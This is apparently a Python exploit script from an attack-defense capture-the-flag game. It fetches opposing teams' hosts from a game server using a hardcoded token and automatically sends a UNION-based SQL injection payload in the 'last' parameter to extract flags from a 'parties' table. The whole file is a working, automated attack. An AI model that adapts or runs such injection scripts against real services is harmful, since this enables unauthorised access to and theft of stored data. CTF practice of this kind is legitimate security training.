import requests 
from pwn import *
from random import randint
import sys

from os import listdir
from os.path import isfile, join, dirname, abspath
import swpag_client as sc
  
url='http://34.195.187.175'
token= '66978175b387ba7b6dee386d16b40b29'
t = sc.Team(url, token);

targets = t.get_targets(2)
for target in targets:
    #try: 
        print(target['hostname'])
        print(target['flag_id'])

        URL = "http://{}:10002/".format((target['hostname']))
        #URL="http://team8:10002/"  
        PARAMS = {'first':'firstname', 'last':'lastname\' UNION SELECT invitation AS data FROM parties where id={} ;--'.format(target['flag_id']),'age':16} 
        r = requests.get(url = URL+"kid", params = PARAMS) 
        kidid = r.text[-4:]
        PARAMS = {'kid': kidid, 'party' : target['flag_id']}
        r = requests.get(url = URL+"attend", params = PARAMS)
        data = r.text

        PARAMS = {'kid': kidid}
        r = requests.get(url=URL+"find", params = PARAMS)
        data = r.text
        
        print(data)
    #except Exception as ex:
        print("Error")
